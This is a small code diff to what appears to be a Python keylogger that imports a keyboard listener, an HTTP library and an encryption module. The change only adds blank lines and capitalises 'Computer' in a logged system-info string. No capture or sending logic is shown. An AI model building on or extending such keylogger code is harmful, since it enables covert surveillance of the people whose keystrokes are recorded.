@@ -6,6 +6,7 @@ import win32process
 from pynput.keyboard import Listener, Key
 import requests
 import datetime
+
 from Encryption import encryption
 
 
@@ -198,7 +199,9 @@ if __name__ == "__main__":
 
 
     system_info = get_system_info()
-    system_info_line = f"[System Info] computer Name: {system_info['computer_name']}\n"
+
+    system_info_line = f"[System Info] Computer Name: {system_info['computer_name']}\n"
+
     keylogger.write_to_file(system_info_line)
     print(system_info_line)
 
